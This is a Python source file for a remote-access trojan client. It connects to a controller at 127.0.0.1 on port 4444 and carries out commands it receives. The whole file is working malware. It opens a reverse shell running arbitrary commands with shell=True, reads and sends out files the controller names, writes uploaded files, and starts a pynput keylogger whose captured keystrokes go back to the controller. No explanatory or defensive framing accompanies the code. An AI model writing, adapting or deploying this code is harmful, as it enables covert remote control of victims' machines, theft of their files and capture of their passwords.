import socket
import subprocess
import os
from pynput.keyboard import Key, Listener
import threading

pressed_keys = ''
previous_keylog_state = "off"

def download_file(client_socket, filename):
    if os.path.isfile(filename):
        with open(filename, 'rb') as f:
            contents = f.read()
        client_socket.send(contents)
    else:
        client_socket.send("File Not Found".encode())

def upload_file(client_socket, filename):
    contents = client_socket.recv(1024*10000)
    # if contents.decode() != 'File Not Found':
    with open(filename, 'wb') as f:
        f.write(contents)

def change_directory(client_socket, dirname):
    if dirname == "..":
        current_dir = os.getcwd()
        parent_dir = os.path.abspath(os.path.join(current_dir, os.pardir))
        os.chdir(parent_dir)
        client_socket.send("Successful Directory Change to parent directory".encode())
    elif os.path.isdir(dirname):
        os.chdir(dirname)
        client_socket.send("Successful Directory Change".encode())
    else:
        client_socket.send("Directory Not Found".encode())

def pressed(key):
    global pressed_keys
    pressed_keys += str(key)

def keylog():
    global l
    l = Listener(on_press= pressed)
    l.start()

def keylog_handling(client_socket, keylog_state):    
    global previous_keylog_state
    global t1
    global l
    if previous_keylog_state == keylog_state:
        client_socket.send("keylog state is same".encode())
    else:
        if keylog_state == "on":
            t1 = threading.Thread(target = keylog())
            t1.start()
            previous_keylog_state = "on"
            client_socket.send("Keylogger ON".encode())
        elif keylog_state == "off":
            l.stop()
            t1.join()
            previous_keylog_state = "off"
            global pressed_keys
            client_socket.send("Pressed keys are: {}".format(pressed_keys).encode())
            pressed_keys = ''
        else:
            client_socket.send("Incorrect Keylog State".encode())

def execute_command(client_socket, command):
    p = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = p.communicate()
    if len(output) > 0:
        answer = str(output.decode())
    else:
        answer = str(error.decode())
    client_socket.send(answer.encode())

def main():
    ip_address = '127.0.0.1'
    port_number = 4444

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((ip_address, port_number))

    command = client_socket.recv(1024).decode()   
    while command != 'quit':
        command_parts = command.split(" ")
        if command_parts[0] == "download":
            download_file(client_socket, command_parts[1])
        elif command_parts[0] == "upload":
            upload_file(client_socket, command_parts[1])
        elif command_parts[0] == "cd":
            change_directory(client_socket, command_parts[1])
        elif command_parts[0] == "keylog":
            keylog_handling(client_socket, command_parts[1])
        else:
            execute_command(client_socket, command)
        command = client_socket.recv(1024).decode() 
    client_socket.close()

main()
